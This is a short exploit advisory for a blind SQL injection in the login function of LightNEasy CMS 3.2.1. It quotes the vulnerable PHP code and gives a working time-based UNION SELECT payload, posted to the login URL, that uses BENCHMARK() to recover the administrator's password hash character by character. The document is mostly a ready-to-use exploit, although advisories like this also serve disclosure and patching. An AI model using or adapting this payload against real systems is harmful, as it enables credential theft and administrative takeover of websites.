LightNEasy Cms 3.2.1 Blind SQL Injection Vulnerability
======================================================

# Exploit Title: LightNEasy Cms 3.2.1 Blind SQL Injection Vulnerability
# Date: 20.09.2010
# Author: Stephan Sattler // Solidmedia.de
# Software Website: http://www.lightneasy.org/
# Software Link: http://www.lightneasy.org/addons/downloads/send.php?dlid=127
# Version: 3.2.1
# Special Thanks to: Dominik Landtwing
  
  
[ Vulnerability]
 
# Vulnerable Code:
 
common.php line 112-148
 
function login() {
    if($_SESSION[$set[&#039;password&#039;]]!="1") {
    if($_GET[&#039;do&#039;]=="login" && $_POST[&#039;handle&#039;]!="") {
        if($row = fetch_array($result)) {
            if($row[&#039;password&#039;] == sha1($_POST[&#039;password&#039;])) {
                    ...
 
}}}}}
  
# Explanation:
 
$_POST[&#039;handle&#039;] isn&#039;t sanitized before executing the database query.
 
 
Since the only user after a fresh install is the admin-user with id 1 and
a normal visitor can&#039;t register we have to retrieve the admin hash by using benchmark().
 
# Exploiting the Vulnerability // PoC:
 
URL: http://localhost/LNE/LightNEasy.php?do=login
 
Postdata:
 
handle=" UNION SELECT IF(SUBSTRING(password,1 ,1) = CHAR(98), BENCHMARK(1000000, ENCODE(&#039;Slow&#039;,&#039;Down&#039;)), null),2,3,4,5,6,7,8,9,10,11 FROM lne_users WHERE id="1&password=&do=login&=Login
 
This will trigger benchmark() if the first character of the admin hash is b.



